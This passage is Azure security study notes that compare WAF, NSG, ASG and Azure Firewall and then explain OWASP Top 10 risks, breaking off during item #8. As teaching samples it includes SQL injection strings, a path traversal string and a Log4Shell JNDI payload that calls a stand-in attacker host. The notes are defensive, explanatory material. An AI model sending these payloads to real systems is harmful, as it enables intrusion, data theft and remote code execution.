# 🛡️ WAF, NSG, ASG, Firewall & Security — Azure Study Notes

> **Topics Covered:** WAF vs NSG vs ASG vs Firewall, Layer-4 vs Layer-7 Security,
> WAF Implementation, OWASP Top-10, SQL Injection, XSS, DoS, DDoS
> **Format:** WHAT, WHY, HOW, WHERE, REAL USE CASES

---

# 📌 Table of Contents

1. [How WAF Differs from NSG, ASG and Firewall](#1-how-waf-differs-from-nsg-asg-and-firewall)
2. [Layer-7 vs Layer-4 — Security & Traffic Routing](#2-layer-7-vs-layer-4--security--traffic-routing)
3. [When Do We Need to Implement WAF?](#3-when-do-we-need-to-implement-waf)
4. [OWASP Top-10 Vulnerabilities](#4-owasp-top-10-vulnerabilities)
5. [SQL Injection, XSS, DoS, DDoS](#5-sql-injection-xss-dos-ddos)

---

# 1. How WAF Differs from NSG, ASG and Firewall

## 🔷 The Big Picture — Security Layers in Azure

Before comparing, understand that each tool operates at a 
**different layer** and solves a **different problem**.
They are NOT replacements for each other — they work TOGETHER.

```text
INTERNET
|
| ← DDoS Protection (volumetric attacks)
|
| ← WAF (Web Application Firewall) — Layer 7
|   Protects: HTTP/HTTPS content, URLs, headers, cookies
|
| ← Azure Firewall — Layer 4 + Layer 7
|   Protects: Network traffic, FQDNs, threat intelligence
|
| ← NSG (Network Security Group) — Layer 4
|   Protects: VNet/Subnet/NIC level — IP, Port, Protocol
|
| ← ASG (Application Security Group) — Layer 4
|   Protects: Groups VMs logically for NSG rules
|
↓
YOUR RESOURCES (VMs, DBs, App Servers)
````

---

## 🔷 NSG — Network Security Group

### WHAT

An **NSG** is a basic **Layer-4 firewall** in Azure that controls 
**inbound and outbound traffic** to/from:

- Subnets
- Individual Network Interfaces (NICs) on VMs

It works with **rules** based on:

- Source/Destination IP
- Source/Destination Port
- Protocol (TCP, UDP, ICMP)
- Direction (Inbound / Outbound)

### HOW NSG Works

NSG Rule Example:

| Priority | Name | Port | Protocol | Source | Destination | Action |
|----------|------|------|----------|---------|-------------|--------|
| 100 | Allow-HTTP | 80 | TCP | Internet | 10.0.1.0/24 | Allow ✅ |
| 110 | Allow-HTTPS | 443 | TCP | Internet | 10.0.1.0/24 | Allow ✅ |
| 120 | Allow-SSH | 22 | TCP | 203.0.113.5 | 10.0.1.4 | Allow ✅ |
| 200 | Deny-All | * | * | * | * | Deny ❌ |

Rules evaluated in PRIORITY ORDER (lowest number = highest priority)

First matching rule WINS — rest are ignored

### NSG Key Facts

WHERE applied:

Subnet level → applies to ALL resources in the subnet

NIC level → applies to a specific VM only

WHAT it sees:

✅ Source IP / Destination IP

✅ Source Port / Destination Port

✅ Protocol (TCP/UDP/ICMP)

WHAT it CANNOT see:

❌ HTTP headers

❌ URL paths

❌ Request content

❌ SQL injection in payload

❌ Cookie values

---


### NSG Limitations

| Limitation | Explanation |
|-----------|-------------|
| No content inspection | Cannot read what's inside the HTTP packet |
| No FQDN filtering | Cannot block by domain name (e.g., block evil.com) |
| No threat intelligence | Doesn't know about known malicious IPs automatically |
| Stateful but basic | Tracks connections but no deep packet inspection |
| No logging by default | Must enable NSG Flow Logs manually |

---

## 🔷 ASG — Application Security Group

### WHAT

An **ASG** is NOT a firewall itself. It is a **logical grouping mechanism** 
that makes NSG rules easier to manage by letting you 
**group VMs by role/function** instead of using IP addresses.

### The Problem ASG Solves

WITHOUT ASG:

```text
You have 20 web servers: 10.0.1.4, 10.0.1.5, 10.0.1.6 ... 10.0.1.23

NSG Rule:
Allow port 80 from Internet to 10.0.1.4 ← tedious
Allow port 80 from Internet to 10.0.1.5 ← tedious
Allow port 80 from Internet to 10.0.1.6 ← tedious
... 20 rules for 20 servers 😩

New server added? → Update ALL rules 😩
```

WITH ASG:

```text
Create ASG: "WebServers"
Add all 20 web server NICs to "WebServers" ASG

NSG Rule:
Allow port 80 from Internet to ASG:WebServers ✅ ← ONE rule

New server added? → Just add NIC to ASG
NSG rule automatically applies ✅
```
---

### HOW ASG Works with NSG

ASGs Defined:

```text
ASG-WebServers → contains: VM1, VM2, VM3 (web servers)
ASG-AppServers → contains: VM4, VM5 (app servers)
ASG-DBServers → contains: VM6 (database server)
```

NSG Rules using ASGs:

| Priority | Source | Destination | Port | Action |
|----------|---------|-------------|------|--------|
| 100 | Internet | ASG-WebServers | 80 | Allow ✅ |
| 110 | ASG-WebServers | ASG-AppServers | 8080 | Allow ✅ |
| 120 | ASG-AppServers | ASG-DBServers | 1433 | Allow ✅ |
| 200 | * | * | * | Deny ❌ |

Result:

```text
Internet → WebServers ✅ (port 80 only)
WebServers → AppServers ✅ (port 8080 only)
AppServers → DBServers ✅ (port 1433 only)
Internet → DBServers ❌ (blocked!)
Internet → AppServers ❌ (blocked!)
```

```text
```

### ASG Key Facts

| Fact | Detail |
|------|--------|
| **What it is** | Logical grouping of VM NICs |
| **Works with** | NSG rules only |
| **Replaces** | IP address lists in NSG rules |
| **Scope** | Same VNet only (cannot span VNets) |
| **Layer** | Layer 4 (via NSG) |
| **Standalone?** | No — needs NSG to enforce rules |

---

## 🔷 Azure Firewall

### WHAT

**Azure Firewall** is a **fully managed, cloud-native, stateful firewall** 
that provides **advanced network-level and application-level protection** 
across your entire VNet or Hub-Spoke network.

It goes far beyond NSG — it can filter by domain names, detect threats, 
and inspect traffic at both Layer 4 AND Layer 7 (limited).

### HOW Azure Firewall Works

All traffic in Hub-Spoke goes THROUGH Azure Firewall:

```text
Spoke VM → UDR (Route Table) → Azure Firewall → Decision
|
┌─────────────────┼─────────────────────┐
↓                 ↓                     ↓
Network Rules     Application Rules     DNAT Rules
(Layer 4)         (Layer 7 — FQDN)      (Port forwarding)

IP+Port+Proto     HTTP/HTTPS FQDNs      Inbound NAT
```


### Azure Firewall Rule Types

| Rule Type | What It Filters | Example |
|-----------|----------------|---------|
| **Network Rules** | IP, Port, Protocol | Allow TCP from 10.0.0.0/16 to 8.8.8.8:53 |
| **Application Rules** | HTTP/HTTPS FQDNs | Allow *.microsoft.com, deny *.evil.com |
| **DNAT Rules** | Inbound port translation | Translate public:3389 → private VM:3389 |
| **Threat Intelligence** | Known malicious IPs/domains | Auto-deny known bad actors |

### Azure Firewall vs NSG

| Feature | NSG | Azure Firewall |
|---------|-----|---------------|
| Layer | Layer 4 | Layer 4 + Layer 7 (partial) |
| Scope | Subnet / NIC | Entire VNet / Hub-Spoke |
| FQDN filtering | ❌ No | ✅ Yes |
| Threat intelligence | ❌ No | ✅ Yes (Microsoft feeds) |
| Centralized management | ❌ No (per subnet) | ✅ Yes |
| Logging | Manual (Flow Logs) | ✅ Built-in to Log Analytics |
| Cost | Free | Paid (fixed + data processing) |
| HTTP content inspection | ❌ No | ⚠️ Partial (FQDN only) |
| SQL injection detection | ❌ No | ❌ No |
| Use in Hub-Spoke | As spoke-level control | As hub-level central control |

---

## 🔷 WAF — Web Application Firewall

### WHAT
**WAF (Web Application Firewall)** is a **Layer-7 security tool** specifically 
designed to protect **web applications** from attacks that exploit 
**HTTP/HTTPS vulnerabilities** — things that NSG and Azure Firewall 
**completely miss** because they don't read request content.

WAF reads and inspects:
- HTTP request body
- URL paths and query strings
- HTTP headers
- Cookies
- Form data
- JSON/XML payloads

### HOW WAF Works

Attacker sends malicious HTTP request:

GET /products?id=1' OR '1'='1 HTTP/1.1
Host: myshop.com
Cookie: session=abc123

↓ Request hits WAF first

WAF inspects:
✅ URL parameters checked for SQL injection patterns
✅ Headers checked for XSS payloads
✅ Body checked against OWASP rule set
✅ Rate limiting checked

WAF Decision:
"SQL injection pattern detected in query string!"
→ Block request ❌ → Return 403 Forbidden to attacker

Legitimate request:
GET /products?id=42 HTTP/1.1
→ WAF: No threats found ✅ → Forward to web server


### Where WAF Lives in Azure

| Azure Service | WAF Support | Use Case |
|--------------|-------------|---------|
| **Azure Application Gateway** | ✅ WAF v2 | Regional web app protection |
| **Azure Front Door** | ✅ WAF Policy | Global web app protection |
| **Azure CDN** | ✅ WAF Policy | CDN-level protection |

### WAF Modes

| Mode | Behavior |
|------|---------|
| **Detection Mode** | Logs threats but does NOT block. Use for testing/tuning |
| **Prevention Mode** | Actively BLOCKS detected threats. Use in production |

### WAF Rule Sets

| Rule Set | Description |
|----------|-------------|
| **OWASP 3.2** | Core Rule Set based on OWASP Top-10 |
| **OWASP 3.1** | Previous version — still widely used |
| **Microsoft Default** | Microsoft-managed rules for common threats |
| **Custom Rules** | Your own rules — IP blocks, rate limits, geo-filtering |
| **Bot Protection** | Blocks known malicious bots and scrapers |

---

## 🔷 Full Comparison — WAF vs NSG vs ASG vs Azure Firewall

| Feature | NSG | ASG | Azure Firewall | WAF |
|---------|-----|-----|---------------|-----|
| **Layer** | Layer 4 | Layer 4 (via NSG) | Layer 4 + 7 | Layer 7 |
| **Filters by IP/Port** | ✅ | ✅ (via NSG) | ✅ | ⚠️ (secondary) |
| **Filters by FQDN** | ❌ | ❌ | ✅ | ✅ |
| **Reads HTTP content** | ❌ | ❌ | ❌ | ✅ |
| **SQL injection detection** | ❌ | ❌ | ❌ | ✅ |
| **XSS detection** | ❌ | ❌ | ❌ | ✅ |
| **Bot protection** | ❌ | ❌ | ⚠️ (partial) | ✅ |
| **OWASP rules** | ❌ | ❌ | ❌ | ✅ |
| **DDoS protection** | ❌ | ❌ | ❌ | ⚠️ (rate limiting) |
| **VM grouping** | ❌ | ✅ | ❌ | ❌ |
| **Scope** | Subnet/NIC | NIC group | VNet/Hub | Web app endpoint |
| **Managed by** | You | You | You (policy) | You (rule sets) |
| **Cost** | Free | Free | Paid | Paid |
| **Standalone** | ✅ | ❌ | ✅ | ✅ |

---

## 🔷 How They Work TOGETHER (Defense in Depth)

```text
INTERNET
    │
    ▼
[DDoS Protection Standard]
← Protects against volumetric flood attacks

    │
    ▼
[WAF on Application Gateway / Front Door]
← Protects against SQL Injection, XSS, OWASP Top 10 threats, and bot attacks

    │
    ▼
[Azure Firewall in Hub VNet]
← Provides FQDN filtering, threat intelligence, and network rule enforcement

    │
    ▼
[NSG on Subnet]
← Allows only required ports (80/443) and blocks all other traffic

    │
    ▼
[ASG on VM NICs]
← Enables logical grouping and role-based security rules

    │
    ▼
[Your Web Application VM] ✅
```

### Defense in Depth

This architecture follows the **Defense in Depth** security principle.

Multiple security layers are placed between the internet and the application. Each layer protects against different attack types, meaning an attacker must successfully bypass **every security control** before reaching the application.

✅ DDoS Protection mitigates large-scale network attacks  
✅ WAF blocks web application attacks  
✅ Azure Firewall controls and inspects network traffic  
✅ NSGs restrict subnet-level access  
✅ ASGs provide granular workload-based security

The result is a highly secure, multi-layered architecture where no single security control becomes a single point of failure.

---

# 2. Layer-7 vs Layer-4 — Security & Traffic Routing

## 🔷 OSI Model — Quick Refresher

```text
┌─────────────────────────────────────────────────────────┐
│ Layer 7 — Application    HTTP, HTTPS, DNS, FTP, SMTP   │ ← WAF operates here
│ Layer 6 — Presentation   SSL/TLS Encryption            │
│ Layer 5 — Session        Session Management            │
│ Layer 4 — Transport      TCP, UDP, Ports              │ ← NSG, Azure LB here
│ Layer 3 — Network        IP Addresses, Routing        │ ← Routing here
│ Layer 2 — Data Link      MAC Addresses                │
│ Layer 1 — Physical       Cables, Hardware             │
└─────────────────────────────────────────────────────────┘
```

---

## 🔷 Layer 4 — Transport Layer

### WHAT Layer 4 Sees

Packet arriving at Layer 4:

```text
┌─────────────────────────────────────────┐
│ Source IP: 203.0.113.5                  │ ✅ Visible
│ Destination IP: 10.0.1.4               │ ✅ Visible
│ Source Port: 54231                     │ ✅ Visible
│ Destination Port: 443                  │ ✅ Visible
│ Protocol: TCP                          │ ✅ Visible
│ ─────────────────────────────────────  │
│ PAYLOAD (encrypted HTTP content)       │ ❌ Not Visible
│ GET /admin/delete?user=all             │ ❌ Not Visible
│ Cookie: session=stolen_token           │ ❌ Not Visible
│ Authorization: Bearer eyJ...           │ ❌ Not Visible
└─────────────────────────────────────────┘
```

### Layer 4 Security Controls

| Control | What It Does | Tool |
|----------|-------------|------|
| Port blocking | Block/allow specific ports | NSG |
| IP whitelisting | Allow specific IPs only | NSG |
| Protocol filtering | Allow TCP but block UDP | NSG |
| Load balancing | Distribute TCP/UDP connections | Azure Load Balancer |
| Connection tracking | Track established connections | NSG (Stateful) |

### Layer 4 Security Concerns

#### WHAT Layer 4 CANNOT Protect Against

❌ SQL Injection → Payload is inside HTTP body (invisible at L4)  
❌ XSS Attacks → Malicious script in HTTP request (invisible at L4)  
❌ CSRF Attacks → Forged HTTP requests (invisible at L4)  
❌ Path Traversal → `../../etc/passwd` in URL (not inspected)  
❌ Token Theft → Stolen authentication headers (invisible at L4)  
❌ API Abuse → Valid port/IP but malicious request content  

#### WHAT Layer 4 CAN Protect Against

✅ Port scanning attacks (block unnecessary ports)  
✅ IP-based attacks (block known bad IPs)  
✅ DDoS flood attacks (basic mitigation)  
✅ Unauthorized protocol access (block UDP on web services)  
✅ Network segmentation (prevent direct access to backend subnets)  

### HOW Layer 4 Routes Traffic

Layer 4 Load Balancer (Azure Load Balancer):

```text
Incoming TCP Connection → Port 80
            │
            ▼
Load Balancer Checks:

Destination IP: 20.10.5.1
Destination Port: 80
Protocol: TCP

            │
            ▼

Backend Pool

VM1: 10.0.1.4 ← Connection 1
VM2: 10.0.1.5 ← Connection 2
VM3: 10.0.1.6 ← Connection 3

Round Robin / Hash-Based Distribution

No reading of HTTP content
Pure IP:Port routing ✅
```

---

## 🔷 Layer 7 — Application Layer

### WHAT Layer 7 Sees

HTTP Request arriving at Layer 7:

```text
┌─────────────────────────────────────────────────────┐
│ Source IP: 203.0.113.5                             │ ✅ Visible
│ Destination IP: 10.0.1.4                           │ ✅ Visible
│ Protocol: HTTPS                                    │ ✅ Visible
│ ─────────────────────────────────────────────────  │
│ METHOD: POST                                       │ ✅ Visible
│ URL PATH: /api/users/login                         │ ✅ Visible
│ HEADERS:                                           │
│ Host: myapp.com                                    │ ✅ Visible
│ User-Agent: Mozilla/5.0                            │ ✅ Visible
│ Cookie: session=abc123                             │ ✅ Visible
│ Authorization: Bearer eyJhbGciOiJSUzI1NiJ9         │ ✅ Visible
│ BODY:                                              │
│ {"username":"admin","password":"' OR 1=1 --"}      │ ✅ Visible
│                                                    │
│ WAF detects SQL Injection pattern                  │ ✅
└─────────────────────────────────────────────────────┘
```

### Layer 7 Security Controls

| Control | What It Does | Tool |
|----------|-------------|------|
| WAF Rules | Detect and block malicious HTTP content | WAF |
| URL Filtering | Block specific paths | WAF Custom Rules |
| Rate Limiting | Limit requests per IP | WAF / Front Door |
| Geo Filtering | Block traffic from countries | WAF |
| SSL Termination | Decrypt HTTPS for inspection | App Gateway / Front Door |
| Header Inspection | Analyze or modify headers | WAF |
| Bot Detection | Detect automated attacks | WAF Bot Protection |
| Cookie Protection | Validate session cookies | WAF |

### Layer 7 Security Concerns

#### WHAT Layer 7 Protects Against

✅ SQL Injection  
✅ Cross-Site Scripting (XSS)  
✅ Cross-Site Request Forgery (CSRF)  
✅ Path Traversal Attacks  
✅ Command Injection  
✅ Bot Attacks  
✅ Application-Layer DDoS  
✅ Authentication Bypass Attempts  
✅ Sensitive Data Exposure Patterns  

### HOW Layer 7 Routes Traffic

Layer 7 Load Balancer (Azure Application Gateway):

```text
Incoming HTTPS Request

GET /api/products HTTP/1.1
Host: myapp.com

            │
            ▼

SSL Termination
(HTTPS → HTTP)

            │
            ▼

WAF Inspection

            │
            ▼

Content-Based Routing

/api/*      → API Backend Pool
/images/*   → Azure Blob Storage
/admin/*    → Admin Backend Pool
/checkout/* → Payment Backend Pool

Host-Based Routing

api.myapp.com   → API Servers
admin.myapp.com → Admin Servers
myapp.com       → Web Servers

Cookie-Based Routing

user=premium → Premium Pool
user=basic   → Standard Pool

Content-aware routing ✅
```

---

## 🔷 Layer 4 vs Layer 7 — Security Comparison

| Security Aspect | Layer 4 | Layer 7 |
|----------------|---------|---------|
| Sees packet content | ❌ No | ✅ Yes |
| SQL Injection Detection | ❌ No | ✅ Yes |
| XSS Detection | ❌ No | ✅ Yes |
| Port-Based Protection | ✅ Yes | ✅ Yes |
| IP-Based Protection | ✅ Yes | ✅ Yes |
| URL Inspection | ❌ No | ✅ Yes |
| Bot Detection | ❌ No | ✅ Yes |
| SSL Inspection | ❌ No | ✅ Yes |
| Rate Limiting | Limited | Advanced |
| Geo Blocking | ❌ No | ✅ Yes |
| Header Inspection | ❌ No | ✅ Yes |
| Routing Intelligence | IP + Port | URL + Header + Cookie |
| Performance Impact | Very Low | Moderate |
| Azure Services | NSG, Azure Load Balancer | WAF, Application Gateway, Front Door |

---

## 🔷 Traffic Routing — Layer 4 vs Layer 7

### LAYER 4 ROUTING (Azure Load Balancer)

```text
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Client IP: 203.0.113.5
Port: 80

            │
            ▼

[Azure Load Balancer]

Rule:
Port 80 → Backend Pool A

Distribution:
• Round Robin
• Source IP Hash

       ┌───────────────┐
       ▼               ▼

    VM-1            VM-2
  (10.0.1.4)     (10.0.1.5)

No content inspection

Pure TCP/UDP distribution

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### LAYER 7 ROUTING (Application Gateway)

```text
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HTTPS Request

GET /api/orders HTTP/1.1
Host: shop.com

            │
            ▼

[Application Gateway + WAF]

Step 1: SSL Termination
Step 2: WAF Inspection
Step 3: Read URL Path (/api/orders)
Step 4: Match Routing Rule

/api/* → API Backend Pool

            │
      ┌─────┴─────┐
      ▼           ▼

  API-VM-1    API-VM-2
 (10.0.2.4)  (10.0.2.5)

Content-aware routing ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# 3. When Do We Need to Implement WAF?

## 🔷 WHEN — Trigger Conditions

### Always Implement WAF When

✅ You have a public-facing web application  
→ Any application accessible from the internet should be protected by a WAF.

✅ Your application accepts user input  
→ Login forms, search fields, comment sections, file uploads, and APIs are common attack vectors.

✅ Your application stores sensitive data  
→ Personal information, healthcare records, payment information, and credentials require additional protection.

✅ You must meet compliance requirements

- PCI-DSS → WAF is strongly recommended and often required.
- HIPAA → WAF is a common security control.
- ISO 27001 → Supports secure application architecture.
- SOC 2 → Improves security posture and control coverage.

✅ Your application uses a database backend  
→ SQL Injection remains one of the most common web application attacks.

✅ You expose APIs to the internet  
→ APIs are frequent targets for abuse, injection attacks, and excessive requests.

✅ You have experienced previous attacks  
→ A previous security incident is a strong indicator that additional protection is needed.

✅ Your application is business-critical  
→ WAF helps prevent application downtime caused by attacks and abuse.

### Typical Azure Deployment

```text
Internet
    │
    ▼
Azure Front Door (Optional)
    │
    ▼
Application Gateway + WAF
    │
    ▼
Web/API Servers
    │
    ▼
Database

WAF inspects every HTTP/HTTPS request
before it reaches the application.
```

---


## 🔷 Real Scenarios — WAF or No WAF?

| Scenario | WAF Needed? | Reason |
|----------|------------|--------|
| E-commerce website with checkout | ✅ YES | PCI-DSS compliance, user input, payment data |
| Internal HR portal (no internet access) | ⚠️ Maybe | Lower risk if accessible only via VPN |
| Public REST API | ✅ YES | Protects against injection, abuse, and scraping |
| Hospital patient portal | ✅ YES | Sensitive healthcare data, HIPAA requirements |
| Static website (HTML only) | ❌ Low Priority | No user input, database, or dynamic content |
| Banking login portal | ✅ YES | Authentication attacks and credential stuffing |
| Gaming leaderboard API | ✅ YES | Score manipulation and injection attacks |
| Admin dashboard (internet-facing) | ✅ CRITICAL | High-value target for attackers |
| Internal company intranet | ⚠️ Consider | Recommended if externally accessible |
| IoT device management portal | ✅ YES | High-value target with injection risks |

---

## 🔷 WHERE to Place WAF in Azure

### Option 1 — Azure Application Gateway + WAF (Regional)

```text
Internet
    │
    ▼
[Application Gateway + WAF]
    │
    ▼
Backend VMs / App Service

Regional Protection (Single Azure Region)

Best For:
• Single-region web applications
• Regional deployments
• Cost-effective WAF implementation
```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Option 2 — Azure Front Door + WAF (Global)

```text
Internet
    │
    ▼
[Azure Front Door + WAF]
    │
    ▼
[Application Gateway]
    │
    ▼
Backend Resources

Global Protection (Multiple Azure Regions)

Best For:
• Global applications
• Multi-region deployments
• CDN acceleration requirements
• Global load balancing
```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Option 3 — Layered Protection (Recommended for Critical Apps)

```text
Internet
    │
    ▼
[Azure Front Door + WAF]
(Global Protection)
    │
    ▼
[Application Gateway + WAF]
(Regional Protection)
    │
    ▼
Backend Resources

Best For:
• Enterprise applications
• Banking systems
• Healthcare platforms
• Mission-critical workloads
```

---

## 🔷 WAF Decision Flow

```text
Is the application accessible from the Internet?
│
├── YES
│   │
│   ├── Does it accept user input OR connect to a database?
│   │   │
│   │   ├── YES
│   │   │     └── Implement WAF ✅
│   │   │
│   │   └── NO
│   │         │
│   │         ├── Is it business-critical or handling sensitive data?
│   │         │
│   │         ├── YES
│   │         │     └── Implement WAF ✅
│   │         │
│   │         └── NO
│   │               └── Consider WAF (lower risk but recommended)
│
└── NO (Internal Only)
    │
    ├── Accessible via VPN or ExpressRoute?
    │
    ├── YES
    │     └── Consider WAF if it is a high-value target
    │
    └── NO
          └── NSG + Azure Firewall may be sufficient
```

---

## 🔷 Quick Rule for Interviews & Real Projects

```text
Public Web Application?
        │
        ▼
     Add WAF

Handles User Input?
        │
        ▼
     Add WAF

Uses Database?
        │
        ▼
     Add WAF

Stores Sensitive Data?
        │
        ▼
     Add WAF

Internet-Facing API?
        │
        ▼
     Add WAF
```

### Simple Memory Trick

```text
Internet + User Input + Database
                =
           WAF Required ✅
```

---


# 4. OWASP Top-10 Vulnerabilities

## 🔷 WHAT is OWASP?

**OWASP (Open Web Application Security Project)** is a non-profit organization that publishes the **OWASP Top 10**, a regularly updated list of the **most critical web application security risks**.

Most modern WAF solutions, including Azure WAF, use rule sets specifically designed to detect and block many of these vulnerabilities.

---

## 🔷 OWASP Top-10 (2021 Edition)

```text
┌───────────────────────────────────────────────────────────────┐
│ #1  Broken Access Control                                     │
│ #2  Cryptographic Failures                                    │
│ #3  Injection (SQL, Command, LDAP, XML)                       │
│ #4  Insecure Design                                            │
│ #5  Security Misconfiguration                                  │
│ #6  Vulnerable and Outdated Components                         │
│ #7  Identification and Authentication Failures                │
│ #8  Software and Data Integrity Failures                       │
│ #9  Security Logging and Monitoring Failures                  │
│ #10 Server-Side Request Forgery (SSRF)                        │
└───────────────────────────────────────────────────────────────┘
```

---

## 🔷 #1 — Broken Access Control

### WHAT

Broken Access Control occurs when users can access resources or perform actions beyond their assigned permissions.

Example:

```text
Legitimate Request:
/api/users/1001/profile

Attacker Changes URL To:
/api/users/1002/profile
```

If the application does not verify ownership or authorization, the attacker can access another user's information.

Another example:

```text
Regular User Accesses:

/admin/deleteAllUsers
```

If authorization checks are missing, administrative actions become accessible to non-admin users.

---

### Real Impact

- Data breaches
- Unauthorized administrative actions
- Account takeover
- Exposure of sensitive information

---

### WAF / Fix

✅ WAF can detect some suspicious access patterns

✅ Verify authorization on EVERY request (server-side)

✅ Apply Principle of Least Privilege

✅ Deny by Default
Only explicitly permitted actions should be allowed

---

## 🔷 #2 — Cryptographic Failures

### WHAT

Cryptographic Failures occur when sensitive information is not properly protected using strong encryption.

Examples:

❌ Passwords stored in plaintext

❌ Passwords hashed using MD5 or SHA1

❌ Credit card data stored unencrypted

❌ Using HTTP instead of HTTPS

❌ TLS 1.0 or SSLv3 still enabled

❌ Hardcoded encryption keys in source code

---

### Real Impact

- Password database leaks
- Credit card theft
- Session hijacking
- Man-in-the-middle attacks
- Regulatory compliance violations

---

### Fix

✅ Use HTTPS everywhere

```text
Minimum Recommended:
TLS 1.2 or TLS 1.3
```

✅ Hash passwords using:

- bcrypt
- Argon2
- PBKDF2

✅ Encrypt sensitive data at rest

```text
AES-256 Encryption
```

✅ Store only necessary sensitive data

✅ Use Azure Key Vault for secrets and key management

---

## 🔷 #3 — Injection

### WHAT

Injection vulnerabilities occur when an application executes attacker-controlled input as commands or queries.

Common Types:

- SQL Injection
- Command Injection
- LDAP Injection
- XML Injection

---

### SQL Injection Example

Attacker Input:

```sql
' OR '1'='1
```

Application Query:

```sql
SELECT *
FROM users
WHERE password=''
OR '1'='1'
```

Result:

```text
Authentication Bypass ❌
```

Because `'1'='1'` is always true, the query may return all users.

---

### Real Impact

- Authentication bypass
- Database compromise
- Data theft
- Remote command execution
- Complete application takeover

---

### Fix

✅ WAF protection

✅ Parameterized Queries (Prepared Statements)

```sql
SELECT *
FROM users
WHERE username = ?
```

✅ Input validation

✅ Input sanitization

✅ Least privilege database accounts

---

## 🔷 #4 — Insecure Design

### WHAT

Insecure Design occurs when security is not considered during the architecture and design phase.

The application may be built exactly as designed, but the design itself is insecure.

Examples:

❌ Password reset emails contain actual passwords

❌ Forgot-password feature reveals whether an email exists

❌ No rate limiting on login pages

❌ Admin and user functions share the same access path

❌ No separation of roles within the application

---

### Real Impact

- User enumeration
- Brute-force attacks
- Privilege escalation
- Business logic abuse
- Data exposure

---

### Fix

✅ Threat Modeling

Identify threats before development begins.

✅ Security Requirements

Include security requirements in user stories.

✅ Secure Design Principles

- Least Privilege
- Fail Secure
- Defense in Depth
- Zero Trust

✅ Conduct architecture and security reviews before development.

---

## 🔷 #5 — Security Misconfiguration

### WHAT

Security Misconfiguration occurs when systems, applications, or cloud resources are configured incorrectly.

These mistakes often expose systems to attackers without any software vulnerability being present.

Examples:

❌ Default credentials remain unchanged

```text
admin / admin
```

❌ Stack traces shown to users

❌ Azure Storage configured as public

❌ Unnecessary ports left open

❌ Debug mode enabled in production

❌ Missing security headers

```text
X-Frame-Options
Content-Security-Policy
X-Content-Type-Options
```

❌ Directory browsing enabled

---

### Real Azure Example

Azure Blob Storage Misconfiguration:

```text
Container Access Level:

Public Access = Blob
```

Result:

```text
Anyone on the Internet can download files ❌
```

Correct Configuration:

```text
Private Access
+
Private Endpoint
```

Result:

```text
Only authorized users can access files ✅
```

---

### Real Impact

- Data leaks
- Administrative compromise
- Information disclosure
- Increased attack surface

---

### Fix

✅ Change default credentials

✅ Disable unused services

✅ Disable debug mode in production

✅ Perform regular security audits

✅ Follow Microsoft Defender for Cloud recommendations

✅ Use Infrastructure as Code (Terraform/Bicep)

Example:

```text
Security controls become version-controlled
and consistently deployed across environments.
```

---

### Interview Memory Trick

```text
Broken Access Control
=
Wrong User Accessing Data

Cryptographic Failures
=
Weak or Missing Encryption

Injection
=
Application Executes Attacker Input

Insecure Design
=
Security Missing During Design

Security Misconfiguration
=
Security Settings Configured Incorrectly
```

---


## 🔷 #6 — Vulnerable and Outdated Components

### WHAT

This vulnerability occurs when applications use libraries, frameworks, operating systems, or software components that contain known security vulnerabilities.

Examples:

❌ Log4Shell (CVE-2021-44228) in Log4j

```text
Remote Code Execution Vulnerability

Affected:
Thousands of Java applications worldwide
```

❌ Heartbleed in OpenSSL

```text
Attackers could read sensitive memory,
including passwords and private keys.
```

❌ Outdated jQuery versions with known XSS vulnerabilities

❌ Vulnerable WordPress plugins

❌ Unpatched operating systems

---

### Real Impact

#### Log4Shell Example

Attacker sends:

```text
${jndi:ldap://attacker.com/exploit}
```

Vulnerable Log4j application:

```text
Receives payload
        ↓
Processes JNDI lookup
        ↓
Connects to attacker-controlled server
        ↓
Downloads malicious code
        ↓
Executes code on server ❌
```

Impact:

- Remote Code Execution (RCE)
- Full server compromise
- Data theft
- Lateral movement

Millions of systems were affected worldwide.

---

### Fix

✅ Update dependencies regularly

✅ Use dependency scanning tools:

- Snyk
- Dependabot
- OWASP Dependency-Check

✅ Subscribe to CVE notifications

✅ Use Microsoft Defender for Containers

✅ Remove unused libraries and packages

---

## 🔷 #7 — Identification and Authentication Failures

### WHAT

Occurs when authentication, login processes, session management, or identity verification mechanisms are weak.

Examples:

❌ No login rate limiting

❌ Weak passwords allowed

```text
password123
admin123
qwerty
```

❌ Sessions remain valid after logout

❌ Session IDs exposed in URLs

❌ No MFA for administrators

❌ Credential stuffing not detected

---

### Credential Stuffing Attack

Attacker obtains:

```text
10 Million leaked usernames/passwords
```

Attack Flow:

```text
Attacker
    │
    ▼
Automated Login Attempts
    │
    ▼
Victims Reuse Passwords
    │
    ▼
Successful Account Takeover ❌
```

Without Protection:

```text
Millions of login attempts
Possible compromise
```

With WAF + Rate Limiting:

```text
Suspicious requests detected
Rate limits applied
Attack blocked ✅
```

---

### Real Impact

- Account takeover
- Identity theft
- Privilege escalation
- Financial fraud

---

### Fix

✅ Enable MFA

✅ Rate-limit login attempts

✅ Use Azure AD or Azure AD B2C

✅ Invalidate sessions after logout

✅ Use secure random session tokens

❌ Bad:

```text
sessionid=1001
sessionid=1002
sessionid=1003
```

✅ Good:

```text
sessionid=a8f72e1d9c7a84f...
```

✅ Check passwords against breach databases

Example:

```text
HaveIBeenPwned
```

---

## 🔷 #8 — Software and Data Integrity Failures

### WHAT

Occurs when software updates, code, plugins, dependencies, or data are trusted without verifying integrity.

Examples:

❌ Unsigned software updates

❌ JavaScript loaded from untrusted CDNs

❌ CI/CD pipelines installing packages without verification

❌ Insecure deserialization

---

### Real Example — SolarWinds Supply Chain Attack

Attack Flow:

```text
Attackers
    │
    ▼
Compromise SolarWinds Build System
    │
    ▼
Insert Malicious Code
    │
    ▼
Official Software Update Generated
    │
    ▼
18,000+ Organizations Install Update
    │
    ▼
Backdoor Access Created ❌
```

Affected:

- US Government Agencies
- Fortune 500 Companies
- Critical Infrastructure

---

### Real Impact

- Supply chain compromise
- Backdoor installation
- Persistent access
- Large-scale espionage

---

### Fix

✅ Verify digital signatures

✅ Use Subresource Integrity (SRI)

Example:

```html
<script
src="https://cdn.example.com/app.js"
integrity="sha384-abc123..."
